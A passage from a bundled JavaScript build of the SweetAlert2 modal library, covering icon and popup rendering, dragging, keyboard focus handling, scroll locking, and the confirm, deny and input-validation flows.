        if (innerParams && params.icon === innerParams.icon) {
          setContent(icon, params);
          applyStyles(icon, params);
          return;
        }
        if (!params.icon && !params.iconHtml) {
          hide4(icon);
          return;
        }
        if (params.icon && Object.keys(iconTypes).indexOf(params.icon) === -1) {
          error(`Unknown icon! Expected "success", "error", "warning", "info" or "question", got "${params.icon}"`);
          hide4(icon);
          return;
        }
        show(icon);
        setContent(icon, params);
        applyStyles(icon, params);
        addClass(icon, params.showClass && params.showClass.icon);
        const colorSchemeQueryList = window.matchMedia("(prefers-color-scheme: dark)");
        colorSchemeQueryList.addEventListener("change", adjustSuccessIconBackgroundColor);
      };
      const applyStyles = (icon, params) => {
        for (const [iconType, iconClassName] of Object.entries(iconTypes)) {
          if (params.icon !== iconType) {
            removeClass(icon, iconClassName);
          }
        }
        addClass(icon, params.icon && iconTypes[params.icon]);
        setColor(icon, params);
        adjustSuccessIconBackgroundColor();
        applyCustomClass(icon, params, "icon");
      };
      const adjustSuccessIconBackgroundColor = () => {
        const popup = getPopup();
        if (!popup) {
          return;
        }
        const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
        const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
        for (let i = 0; i < successIconParts.length; i++) {
          successIconParts[i].style.backgroundColor = popupBackgroundColor;
        }
      };
      const successIconHtml = (params) => `
  ${params.animation ? '<div class="swal2-success-circular-line-left"></div>' : ""}
  <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
  <div class="swal2-success-ring"></div>
  ${params.animation ? '<div class="swal2-success-fix"></div>' : ""}
  ${params.animation ? '<div class="swal2-success-circular-line-right"></div>' : ""}
`;
      const errorIconHtml = `
  <span class="swal2-x-mark">
    <span class="swal2-x-mark-line-left"></span>
    <span class="swal2-x-mark-line-right"></span>
  </span>
`;
      const setContent = (icon, params) => {
        if (!params.icon && !params.iconHtml) {
          return;
        }
        let oldContent = icon.innerHTML;
        let newContent = "";
        if (params.iconHtml) {
          newContent = iconContent(params.iconHtml);
        } else if (params.icon === "success") {
          newContent = successIconHtml(params);
          oldContent = oldContent.replace(/ style=".*?"/g, "");
        } else if (params.icon === "error") {
          newContent = errorIconHtml;
        } else if (params.icon) {
          const defaultIconHtml = {
            question: "?",
            warning: "!",
            info: "i"
          };
          newContent = iconContent(defaultIconHtml[params.icon]);
        }
        if (oldContent.trim() !== newContent.trim()) {
          setInnerHtml(icon, newContent);
        }
      };
      const setColor = (icon, params) => {
        if (!params.iconColor) {
          return;
        }
        icon.style.color = params.iconColor;
        icon.style.borderColor = params.iconColor;
        for (const sel of [".swal2-success-line-tip", ".swal2-success-line-long", ".swal2-x-mark-line-left", ".swal2-x-mark-line-right"]) {
          setStyle(icon, sel, "background-color", params.iconColor);
        }
        setStyle(icon, ".swal2-success-ring", "border-color", params.iconColor);
      };
      const iconContent = (content) => `<div class="${swalClasses["icon-content"]}">${content}</div>`;
      const renderImage = (instance, params) => {
        const image = getImage();
        if (!image) {
          return;
        }
        if (!params.imageUrl) {
          hide4(image);
          return;
        }
        show(image, "");
        image.setAttribute("src", params.imageUrl);
        image.setAttribute("alt", params.imageAlt || "");
        applyNumericalStyle(image, "width", params.imageWidth);
        applyNumericalStyle(image, "height", params.imageHeight);
        image.className = swalClasses.image;
        applyCustomClass(image, params, "image");
      };
      let dragging = false;
      let mousedownX = 0;
      let mousedownY = 0;
      let initialX = 0;
      let initialY = 0;
      const addDraggableListeners = (popup) => {
        popup.addEventListener("mousedown", down);
        document.body.addEventListener("mousemove", move);
        popup.addEventListener("mouseup", up);
        popup.addEventListener("touchstart", down);
        document.body.addEventListener("touchmove", move);
        popup.addEventListener("touchend", up);
      };
      const removeDraggableListeners = (popup) => {
        popup.removeEventListener("mousedown", down);
        document.body.removeEventListener("mousemove", move);
        popup.removeEventListener("mouseup", up);
        popup.removeEventListener("touchstart", down);
        document.body.removeEventListener("touchmove", move);
        popup.removeEventListener("touchend", up);
      };
      const down = (event) => {
        const popup = getPopup();
        if (event.target === popup || getIcon().contains(
          /** @type {HTMLElement} */
          event.target
        )) {
          dragging = true;
          const clientXY = getClientXY(event);
          mousedownX = clientXY.clientX;
          mousedownY = clientXY.clientY;
          initialX = parseInt(popup.style.insetInlineStart) || 0;
          initialY = parseInt(popup.style.insetBlockStart) || 0;
          addClass(popup, "swal2-dragging");
        }
      };
      const move = (event) => {
        const popup = getPopup();
        if (dragging) {
          let {
            clientX,
            clientY
          } = getClientXY(event);
          popup.style.insetInlineStart = `${initialX + (clientX - mousedownX)}px`;
          popup.style.insetBlockStart = `${initialY + (clientY - mousedownY)}px`;
        }
      };
      const up = () => {
        const popup = getPopup();
        dragging = false;
        removeClass(popup, "swal2-dragging");
      };
      const getClientXY = (event) => {
        let clientX = 0, clientY = 0;
        if (event.type.startsWith("mouse")) {
          clientX = /** @type {MouseEvent} */
          event.clientX;
          clientY = /** @type {MouseEvent} */
          event.clientY;
        } else if (event.type.startsWith("touch")) {
          clientX = /** @type {TouchEvent} */
          event.touches[0].clientX;
          clientY = /** @type {TouchEvent} */
          event.touches[0].clientY;
        }
        return {
          clientX,
          clientY
        };
      };
      const renderPopup = (instance, params) => {
        const container = getContainer();
        const popup = getPopup();
        if (!container || !popup) {
          return;
        }
        if (params.toast) {
          applyNumericalStyle(container, "width", params.width);
          popup.style.width = "100%";
          const loader = getLoader();
          if (loader) {
            popup.insertBefore(loader, getIcon());
          }
        } else {
          applyNumericalStyle(popup, "width", params.width);
        }
        applyNumericalStyle(popup, "padding", params.padding);
        if (params.color) {
          popup.style.color = params.color;
        }
        if (params.background) {
          popup.style.background = params.background;
        }
        hide4(getValidationMessage());
        addClasses$1(popup, params);
        if (params.draggable && !params.toast) {
          addClass(popup, swalClasses.draggable);
          addDraggableListeners(popup);
        } else {
          removeClass(popup, swalClasses.draggable);
          removeDraggableListeners(popup);
        }
      };
      const addClasses$1 = (popup, params) => {
        const showClass = params.showClass || {};
        popup.className = `${swalClasses.popup} ${isVisible$1(popup) ? showClass.popup : ""}`;
        if (params.toast) {
          addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
          addClass(popup, swalClasses.toast);
        } else {
          addClass(popup, swalClasses.modal);
        }
        applyCustomClass(popup, params, "popup");
        if (typeof params.customClass === "string") {
          addClass(popup, params.customClass);
        }
        if (params.icon) {
          addClass(popup, swalClasses[`icon-${params.icon}`]);
        }
      };
      const renderProgressSteps = (instance, params) => {
        const progressStepsContainer = getProgressSteps();
        if (!progressStepsContainer) {
          return;
        }
        const {
          progressSteps,
          currentProgressStep
        } = params;
        if (!progressSteps || progressSteps.length === 0 || currentProgressStep === void 0) {
          hide4(progressStepsContainer);
          return;
        }
        show(progressStepsContainer);
        progressStepsContainer.textContent = "";
        if (currentProgressStep >= progressSteps.length) {
          warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
        }
        progressSteps.forEach((step, index2) => {
          const stepEl = createStepElement(step);
          progressStepsContainer.appendChild(stepEl);
          if (index2 === currentProgressStep) {
            addClass(stepEl, swalClasses["active-progress-step"]);
          }
          if (index2 !== progressSteps.length - 1) {
            const lineEl = createLineElement(params);
            progressStepsContainer.appendChild(lineEl);
          }
        });
      };
      const createStepElement = (step) => {
        const stepEl = document.createElement("li");
        addClass(stepEl, swalClasses["progress-step"]);
        setInnerHtml(stepEl, step);
        return stepEl;
      };
      const createLineElement = (params) => {
        const lineEl = document.createElement("li");
        addClass(lineEl, swalClasses["progress-step-line"]);
        if (params.progressStepsDistance) {
          applyNumericalStyle(lineEl, "width", params.progressStepsDistance);
        }
        return lineEl;
      };
      const renderTitle = (instance, params) => {
        const title = getTitle();
        if (!title) {
          return;
        }
        showWhenInnerHtmlPresent(title);
        toggle(title, params.title || params.titleText, "block");
        if (params.title) {
          parseHtmlToContainer(params.title, title);
        }
        if (params.titleText) {
          title.innerText = params.titleText;
        }
        applyCustomClass(title, params, "title");
      };
      const render = (instance, params) => {
        renderPopup(instance, params);
        renderContainer(instance, params);
        renderProgressSteps(instance, params);
        renderIcon(instance, params);
        renderImage(instance, params);
        renderTitle(instance, params);
        renderCloseButton(instance, params);
        renderContent(instance, params);
        renderActions(instance, params);
        renderFooter(instance, params);
        const popup = getPopup();
        if (typeof params.didRender === "function" && popup) {
          params.didRender(popup);
        }
        globalState.eventEmitter.emit("didRender", popup);
      };
      const isVisible = () => {
        return isVisible$1(getPopup());
      };
      const clickConfirm = () => {
        var _dom$getConfirmButton;
        return (_dom$getConfirmButton = getConfirmButton()) === null || _dom$getConfirmButton === void 0 ? void 0 : _dom$getConfirmButton.click();
      };
      const clickDeny = () => {
        var _dom$getDenyButton;
        return (_dom$getDenyButton = getDenyButton()) === null || _dom$getDenyButton === void 0 ? void 0 : _dom$getDenyButton.click();
      };
      const clickCancel = () => {
        var _dom$getCancelButton;
        return (_dom$getCancelButton = getCancelButton()) === null || _dom$getCancelButton === void 0 ? void 0 : _dom$getCancelButton.click();
      };
      const DismissReason = Object.freeze({
        cancel: "cancel",
        backdrop: "backdrop",
        close: "close",
        esc: "esc",
        timer: "timer"
      });
      const removeKeydownHandler = (globalState2) => {
        if (globalState2.keydownTarget && globalState2.keydownHandlerAdded) {
          globalState2.keydownTarget.removeEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = false;
        }
      };
      const addKeydownHandler = (globalState2, innerParams, dismissWith) => {
        removeKeydownHandler(globalState2);
        if (!innerParams.toast) {
          globalState2.keydownHandler = (e) => keydownHandler(innerParams, e, dismissWith);
          globalState2.keydownTarget = innerParams.keydownListenerCapture ? window : getPopup();
          globalState2.keydownListenerCapture = innerParams.keydownListenerCapture;
          globalState2.keydownTarget.addEventListener("keydown", globalState2.keydownHandler, {
            capture: globalState2.keydownListenerCapture
          });
          globalState2.keydownHandlerAdded = true;
        }
      };
      const setFocus = (index2, increment) => {
        var _dom$getPopup;
        const focusableElements = getFocusableElements();
        if (focusableElements.length) {
          index2 = index2 + increment;
          if (index2 === -2) {
            index2 = focusableElements.length - 1;
          }
          if (index2 === focusableElements.length) {
            index2 = 0;
          } else if (index2 === -1) {
            index2 = focusableElements.length - 1;
          }
          focusableElements[index2].focus();
          return;
        }
        (_dom$getPopup = getPopup()) === null || _dom$getPopup === void 0 || _dom$getPopup.focus();
      };
      const arrowKeysNextButton = ["ArrowRight", "ArrowDown"];
      const arrowKeysPreviousButton = ["ArrowLeft", "ArrowUp"];
      const keydownHandler = (innerParams, event, dismissWith) => {
        if (!innerParams) {
          return;
        }
        if (event.isComposing || event.keyCode === 229) {
          return;
        }
        if (innerParams.stopKeydownPropagation) {
          event.stopPropagation();
        }
        if (event.key === "Enter") {
          handleEnter(event, innerParams);
        } else if (event.key === "Tab") {
          handleTab(event);
        } else if ([...arrowKeysNextButton, ...arrowKeysPreviousButton].includes(event.key)) {
          handleArrows(event.key);
        } else if (event.key === "Escape") {
          handleEsc(event, innerParams, dismissWith);
        }
      };
      const handleEnter = (event, innerParams) => {
        if (!callIfFunction(innerParams.allowEnterKey)) {
          return;
        }
        const input = getInput$1(getPopup(), innerParams.input);
        if (event.target && input && event.target instanceof HTMLElement && event.target.outerHTML === input.outerHTML) {
          if (["textarea", "file"].includes(innerParams.input)) {
            return;
          }
          clickConfirm();
          event.preventDefault();
        }
      };
      const handleTab = (event) => {
        const targetElement = event.target;
        const focusableElements = getFocusableElements();
        let btnIndex = -1;
        for (let i = 0; i < focusableElements.length; i++) {
          if (targetElement === focusableElements[i]) {
            btnIndex = i;
            break;
          }
        }
        if (!event.shiftKey) {
          setFocus(btnIndex, 1);
        } else {
          setFocus(btnIndex, -1);
        }
        event.stopPropagation();
        event.preventDefault();
      };
      const handleArrows = (key) => {
        const actions = getActions();
        const confirmButton = getConfirmButton();
        const denyButton = getDenyButton();
        const cancelButton = getCancelButton();
        if (!actions || !confirmButton || !denyButton || !cancelButton) {
          return;
        }
        const buttons = [confirmButton, denyButton, cancelButton];
        if (document.activeElement instanceof HTMLElement && !buttons.includes(document.activeElement)) {
          return;
        }
        const sibling = arrowKeysNextButton.includes(key) ? "nextElementSibling" : "previousElementSibling";
        let buttonToFocus = document.activeElement;
        if (!buttonToFocus) {
          return;
        }
        for (let i = 0; i < actions.children.length; i++) {
          buttonToFocus = buttonToFocus[sibling];
          if (!buttonToFocus) {
            return;
          }
          if (buttonToFocus instanceof HTMLButtonElement && isVisible$1(buttonToFocus)) {
            break;
          }
        }
        if (buttonToFocus instanceof HTMLButtonElement) {
          buttonToFocus.focus();
        }
      };
      const handleEsc = (event, innerParams, dismissWith) => {
        event.preventDefault();
        if (callIfFunction(innerParams.allowEscapeKey)) {
          dismissWith(DismissReason.esc);
        }
      };
      var privateMethods = {
        swalPromiseResolve: /* @__PURE__ */ new WeakMap(),
        swalPromiseReject: /* @__PURE__ */ new WeakMap()
      };
      const setAriaHidden = () => {
        const container = getContainer();
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el) => {
          if (el.contains(container)) {
            return;
          }
          if (el.hasAttribute("aria-hidden")) {
            el.setAttribute("data-previous-aria-hidden", el.getAttribute("aria-hidden") || "");
          }
          el.setAttribute("aria-hidden", "true");
        });
      };
      const unsetAriaHidden = () => {
        const bodyChildren = Array.from(document.body.children);
        bodyChildren.forEach((el) => {
          if (el.hasAttribute("data-previous-aria-hidden")) {
            el.setAttribute("aria-hidden", el.getAttribute("data-previous-aria-hidden") || "");
            el.removeAttribute("data-previous-aria-hidden");
          } else {
            el.removeAttribute("aria-hidden");
          }
        });
      };
      const isSafariOrIOS = typeof window !== "undefined" && !!window.GestureEvent;
      const iOSfix = () => {
        if (isSafariOrIOS && !hasClass(document.body, swalClasses.iosfix)) {
          const offset4 = document.body.scrollTop;
          document.body.style.top = `${offset4 * -1}px`;
          addClass(document.body, swalClasses.iosfix);
          lockBodyScroll();
        }
      };
      const lockBodyScroll = () => {
        const container = getContainer();
        if (!container) {
          return;
        }
        let preventTouchMove;
        container.ontouchstart = (event) => {
          preventTouchMove = shouldPreventTouchMove(event);
        };
        container.ontouchmove = (event) => {
          if (preventTouchMove) {
            event.preventDefault();
            event.stopPropagation();
          }
        };
      };
      const shouldPreventTouchMove = (event) => {
        const target = event.target;
        const container = getContainer();
        const htmlContainer = getHtmlContainer();
        if (!container || !htmlContainer) {
          return false;
        }
        if (isStylus(event) || isZoom(event)) {
          return false;
        }
        if (target === container) {
          return true;
        }
        if (!isScrollable(container) && target instanceof HTMLElement && !selfOrParentIsScrollable(target, htmlContainer) && // #2823
        target.tagName !== "INPUT" && // #1603
        target.tagName !== "TEXTAREA" && // #2266
        !(isScrollable(htmlContainer) && // #1944
        htmlContainer.contains(target))) {
          return true;
        }
        return false;
      };
      const isStylus = (event) => {
        return event.touches && event.touches.length && event.touches[0].touchType === "stylus";
      };
      const isZoom = (event) => {
        return event.touches && event.touches.length > 1;
      };
      const undoIOSfix = () => {
        if (hasClass(document.body, swalClasses.iosfix)) {
          const offset4 = parseInt(document.body.style.top, 10);
          removeClass(document.body, swalClasses.iosfix);
          document.body.style.top = "";
          document.body.scrollTop = offset4 * -1;
        }
      };
      const measureScrollbar = () => {
        const scrollDiv = document.createElement("div");
        scrollDiv.className = swalClasses["scrollbar-measure"];
        document.body.appendChild(scrollDiv);
        const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      };
      let previousBodyPadding = null;
      const replaceScrollbarWithPadding = (initialBodyOverflow) => {
        if (previousBodyPadding !== null) {
          return;
        }
        if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
          previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
          document.body.style.paddingRight = `${previousBodyPadding + measureScrollbar()}px`;
        }
      };
      const undoReplaceScrollbarWithPadding = () => {
        if (previousBodyPadding !== null) {
          document.body.style.paddingRight = `${previousBodyPadding}px`;
          previousBodyPadding = null;
        }
      };
      function removePopupAndResetState(instance, container, returnFocus, didClose) {
        if (isToast()) {
          triggerDidCloseAndDispose(instance, didClose);
        } else {
          restoreActiveElement(returnFocus).then(() => triggerDidCloseAndDispose(instance, didClose));
          removeKeydownHandler(globalState);
        }
        if (isSafariOrIOS) {
          container.setAttribute("style", "display:none !important");
          container.removeAttribute("class");
          container.innerHTML = "";
        } else {
          container.remove();
        }
        if (isModal()) {
          undoReplaceScrollbarWithPadding();
          undoIOSfix();
          unsetAriaHidden();
        }
        removeBodyClasses();
      }
      function removeBodyClasses() {
        removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
      }
      function close(resolveValue) {
        resolveValue = prepareResolveValue(resolveValue);
        const swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
        const didClose = triggerClosePopup(this);
        if (this.isAwaitingPromise) {
          if (!resolveValue.isDismissed) {
            handleAwaitingPromise(this);
            swalPromiseResolve(resolveValue);
          }
        } else if (didClose) {
          swalPromiseResolve(resolveValue);
        }
      }
      const triggerClosePopup = (instance) => {
        const popup = getPopup();
        if (!popup) {
          return false;
        }
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
          return false;
        }
        removeClass(popup, innerParams.showClass.popup);
        addClass(popup, innerParams.hideClass.popup);
        const backdrop = getContainer();
        removeClass(backdrop, innerParams.showClass.backdrop);
        addClass(backdrop, innerParams.hideClass.backdrop);
        handlePopupAnimation(instance, popup, innerParams);
        return true;
      };
      function rejectPromise(error2) {
        const rejectPromise2 = privateMethods.swalPromiseReject.get(this);
        handleAwaitingPromise(this);
        if (rejectPromise2) {
          rejectPromise2(error2);
        }
      }
      const handleAwaitingPromise = (instance) => {
        if (instance.isAwaitingPromise) {
          delete instance.isAwaitingPromise;
          if (!privateProps.innerParams.get(instance)) {
            instance._destroy();
          }
        }
      };
      const prepareResolveValue = (resolveValue) => {
        if (typeof resolveValue === "undefined") {
          return {
            isConfirmed: false,
            isDenied: false,
            isDismissed: true
          };
        }
        return Object.assign({
          isConfirmed: false,
          isDenied: false,
          isDismissed: false
        }, resolveValue);
      };
      const handlePopupAnimation = (instance, popup, innerParams) => {
        var _globalState$eventEmi;
        const container = getContainer();
        const animationIsSupported = hasCssAnimation(popup);
        if (typeof innerParams.willClose === "function") {
          innerParams.willClose(popup);
        }
        (_globalState$eventEmi = globalState.eventEmitter) === null || _globalState$eventEmi === void 0 || _globalState$eventEmi.emit("willClose", popup);
        if (animationIsSupported) {
          animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
        } else {
          removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
        }
      };
      const animatePopup = (instance, popup, container, returnFocus, didClose) => {
        globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
        const swalCloseAnimationFinished = function(e) {
          if (e.target === popup) {
            var _globalState$swalClos;
            (_globalState$swalClos = globalState.swalCloseEventFinishedCallback) === null || _globalState$swalClos === void 0 || _globalState$swalClos.call(globalState);
            delete globalState.swalCloseEventFinishedCallback;
            popup.removeEventListener("animationend", swalCloseAnimationFinished);
            popup.removeEventListener("transitionend", swalCloseAnimationFinished);
          }
        };
        popup.addEventListener("animationend", swalCloseAnimationFinished);
        popup.addEventListener("transitionend", swalCloseAnimationFinished);
      };
      const triggerDidCloseAndDispose = (instance, didClose) => {
        setTimeout(() => {
          var _globalState$eventEmi2;
          if (typeof didClose === "function") {
            didClose.bind(instance.params)();
          }
          (_globalState$eventEmi2 = globalState.eventEmitter) === null || _globalState$eventEmi2 === void 0 || _globalState$eventEmi2.emit("didClose");
          if (instance._destroy) {
            instance._destroy();
          }
        });
      };
      const showLoading = (buttonToReplace) => {
        let popup = getPopup();
        if (!popup) {
          new Swal8();
        }
        popup = getPopup();
        if (!popup) {
          return;
        }
        const loader = getLoader();
        if (isToast()) {
          hide4(getIcon());
        } else {
          replaceButton(popup, buttonToReplace);
        }
        show(loader);
        popup.setAttribute("data-loading", "true");
        popup.setAttribute("aria-busy", "true");
        popup.focus();
      };
      const replaceButton = (popup, buttonToReplace) => {
        const actions = getActions();
        const loader = getLoader();
        if (!actions || !loader) {
          return;
        }
        if (!buttonToReplace && isVisible$1(getConfirmButton())) {
          buttonToReplace = getConfirmButton();
        }
        show(actions);
        if (buttonToReplace) {
          hide4(buttonToReplace);
          loader.setAttribute("data-button-to-replace", buttonToReplace.className);
          actions.insertBefore(loader, buttonToReplace);
        }
        addClass([popup, actions], swalClasses.loading);
      };
      const handleInputOptionsAndValue = (instance, params) => {
        if (params.input === "select" || params.input === "radio") {
          handleInputOptions(instance, params);
        } else if (["text", "email", "number", "tel", "textarea"].some((i) => i === params.input) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
          showLoading(getConfirmButton());
          handleInputValue(instance, params);
        }
      };
      const getInputValue = (instance, innerParams) => {
        const input = instance.getInput();
        if (!input) {
          return null;
        }
        switch (innerParams.input) {
          case "checkbox":
            return getCheckboxValue2(input);
          case "radio":
            return getRadioValue2(input);
          case "file":
            return getFileValue(input);
          default:
            return innerParams.inputAutoTrim ? input.value.trim() : input.value;
        }
      };
      const getCheckboxValue2 = (input) => input.checked ? 1 : 0;
      const getRadioValue2 = (input) => input.checked ? input.value : null;
      const getFileValue = (input) => input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
      const handleInputOptions = (instance, params) => {
        const popup = getPopup();
        if (!popup) {
          return;
        }
        const processInputOptions = (inputOptions) => {
          if (params.input === "select") {
            populateSelectOptions(popup, formatInputOptions(inputOptions), params);
          } else if (params.input === "radio") {
            populateRadioOptions(popup, formatInputOptions(inputOptions), params);
          }
        };
        if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
          showLoading(getConfirmButton());
          asPromise(params.inputOptions).then((inputOptions) => {
            instance.hideLoading();
            processInputOptions(inputOptions);
          });
        } else if (typeof params.inputOptions === "object") {
          processInputOptions(params.inputOptions);
        } else {
          error(`Unexpected type of inputOptions! Expected object, Map or Promise, got ${typeof params.inputOptions}`);
        }
      };
      const handleInputValue = (instance, params) => {
        const input = instance.getInput();
        if (!input) {
          return;
        }
        hide4(input);
        asPromise(params.inputValue).then((inputValue) => {
          input.value = params.input === "number" ? `${parseFloat(inputValue) || 0}` : `${inputValue}`;
          show(input);
          input.focus();
          instance.hideLoading();
        }).catch((err) => {
          error(`Error in inputValue promise: ${err}`);
          input.value = "";
          show(input);
          input.focus();
          instance.hideLoading();
        });
      };
      function populateSelectOptions(popup, inputOptions, params) {
        const select = getDirectChildByClass(popup, swalClasses.select);
        if (!select) {
          return;
        }
        const renderOption = (parent, optionLabel, optionValue) => {
          const option = document.createElement("option");
          option.value = optionValue;
          setInnerHtml(option, optionLabel);
          option.selected = isSelected(optionValue, params.inputValue);
          parent.appendChild(option);
        };
        inputOptions.forEach((inputOption) => {
          const optionValue = inputOption[0];
          const optionLabel = inputOption[1];
          if (Array.isArray(optionLabel)) {
            const optgroup = document.createElement("optgroup");
            optgroup.label = optionValue;
            optgroup.disabled = false;
            select.appendChild(optgroup);
            optionLabel.forEach((o) => renderOption(optgroup, o[1], o[0]));
          } else {
            renderOption(select, optionLabel, optionValue);
          }
        });
        select.focus();
      }
      function populateRadioOptions(popup, inputOptions, params) {
        const radio = getDirectChildByClass(popup, swalClasses.radio);
        if (!radio) {
          return;
        }
        inputOptions.forEach((inputOption) => {
          const radioValue = inputOption[0];
          const radioLabel = inputOption[1];
          const radioInput = document.createElement("input");
          const radioLabelElement = document.createElement("label");
          radioInput.type = "radio";
          radioInput.name = swalClasses.radio;
          radioInput.value = radioValue;
          if (isSelected(radioValue, params.inputValue)) {
            radioInput.checked = true;
          }
          const label = document.createElement("span");
          setInnerHtml(label, radioLabel);
          label.className = swalClasses.label;
          radioLabelElement.appendChild(radioInput);
          radioLabelElement.appendChild(label);
          radio.appendChild(radioLabelElement);
        });
        const radios = radio.querySelectorAll("input");
        if (radios.length) {
          radios[0].focus();
        }
      }
      const formatInputOptions = (inputOptions) => {
        const result = [];
        if (inputOptions instanceof Map) {
          inputOptions.forEach((value, key) => {
            let valueFormatted = value;
            if (typeof valueFormatted === "object") {
              valueFormatted = formatInputOptions(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        } else {
          Object.keys(inputOptions).forEach((key) => {
            let valueFormatted = inputOptions[key];
            if (typeof valueFormatted === "object") {
              valueFormatted = formatInputOptions(valueFormatted);
            }
            result.push([key, valueFormatted]);
          });
        }
        return result;
      };
      const isSelected = (optionValue, inputValue) => {
        return !!inputValue && inputValue.toString() === optionValue.toString();
      };
      const handleConfirmButtonClick = (instance) => {
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.input) {
          handleConfirmOrDenyWithInput(instance, "confirm");
        } else {
          confirm2(instance, true);
        }
      };
      const handleDenyButtonClick = (instance) => {
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableButtons();
        if (innerParams.returnInputValueOnDeny) {
          handleConfirmOrDenyWithInput(instance, "deny");
        } else {
          deny(instance, false);
        }
      };
      const handleCancelButtonClick = (instance, dismissWith) => {
        instance.disableButtons();
        dismissWith(DismissReason.cancel);
      };
      const handleConfirmOrDenyWithInput = (instance, type) => {
        const innerParams = privateProps.innerParams.get(instance);
        if (!innerParams.input) {
          error(`The "input" parameter is needed to be set when using returnInputValueOn${capitalizeFirstLetter(type)}`);
          return;
        }
        const input = instance.getInput();
        const inputValue = getInputValue(instance, innerParams);
        if (innerParams.inputValidator) {
          handleInputValidator(instance, inputValue, type);
        } else if (input && !input.checkValidity()) {
          instance.enableButtons();
          instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
        } else if (type === "deny") {
          deny(instance, inputValue);
        } else {
          confirm2(instance, inputValue);
        }
      };
      const handleInputValidator = (instance, inputValue, type) => {
        const innerParams = privateProps.innerParams.get(instance);
        instance.disableInput();
        const validationPromise = Promise.resolve().then(() => asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage)));
        validationPromise.then((validationMessage) => {
          instance.enableButtons();
          instance.enableInput();
          if (validationMessage) {
            instance.showValidationMessage(validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
            confirm2(instance, inputValue);
          }
        });
      };
      const deny = (instance, value) => {
        const innerParams = privateProps.innerParams.get(instance || void 0);
        if (innerParams.showLoaderOnDeny) {
          showLoading(getDenyButton());
        }
        if (innerParams.preDeny) {
          instance.isAwaitingPromise = true;
          const preDenyPromise = Promise.resolve().then(() => asPromise(innerParams.preDeny(value, innerParams.validationMessage)));
          preDenyPromise.then((preDenyValue) => {
            if (preDenyValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              instance.close({
                isDenied: true,
                value: typeof preDenyValue === "undefined" ? value : preDenyValue
              });
            }
          }).catch((error2) => rejectWith(instance || void 0, error2));
        } else {
          instance.close({
            isDenied: true,
            value
          });
        }
      };
      const succeedWith = (instance, value) => {
        instance.close({
          isConfirmed: true,
          value
        });
      };
      const rejectWith = (instance, error2) => {
        instance.rejectPromise(error2);
      };
      const confirm2 = (instance, value) => {
        const innerParams = privateProps.innerParams.get(instance || void 0);
        if (innerParams.showLoaderOnConfirm) {
          showLoading();
        }
        if (innerParams.preConfirm) {
          instance.resetValidationMessage();
          instance.isAwaitingPromise = true;
          const preConfirmPromise = Promise.resolve().then(() => asPromise(innerParams.preConfirm(value, innerParams.validationMessage)));
          preConfirmPromise.then((preConfirmValue) => {
            if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
            }
          }).catch((error2) => rejectWith(instance || void 0, error2));
        } else {
          succeedWith(instance, value);
        }
      };
      function hideLoading() {
        const innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          return;
        }
        const domCache = privateProps.domCache.get(this);
        hide4(domCache.loader);
        if (isToast()) {
          if (innerParams.icon) {
            show(getIcon());
          }
        } else {
          showRelatedButton(domCache);
        }
        removeClass([domCache.popup, domCache.actions], swalClasses.loading);
        domCache.popup.removeAttribute("aria-busy");
        domCache.popup.removeAttribute("data-loading");
        domCache.confirmButton.disabled = false;
        domCache.denyButton.disabled = false;
        domCache.cancelButton.disabled = false;
      }
      const showRelatedButton = (domCache) => {
        const buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
        if (buttonToReplace.length) {
          show(buttonToReplace[0], "inline-block");
        } else if (allButtonsAreHidden()) {
          hide4(domCache.actions);
        }
      };
      function getInput() {
        const innerParams = privateProps.innerParams.get(this);
        const domCache = privateProps.domCache.get(this);
        if (!domCache) {
          return null;
        }
        return getInput$1(domCache.popup, innerParams.input);
      }
      function setButtonsDisabled(instance, buttons, disabled) {
        const domCache = privateProps.domCache.get(instance);
        buttons.forEach((button) => {
          domCache[button].disabled = disabled;
        });
      }
      function setInputDisabled(input, disabled) {
        const popup = getPopup();
        if (!popup || !input) {
          return;
        }
        if (input.type === "radio") {
          const radios = popup.querySelectorAll(`[name="${swalClasses.radio}"]`);
          for (let i = 0; i < radios.length; i++) {
            radios[i].disabled = disabled;
          }
        } else {
          input.disabled = disabled;
        }
      }
      function enableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
      }
      function disableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
      }
      function enableInput() {
        setInputDisabled(this.getInput(), false);
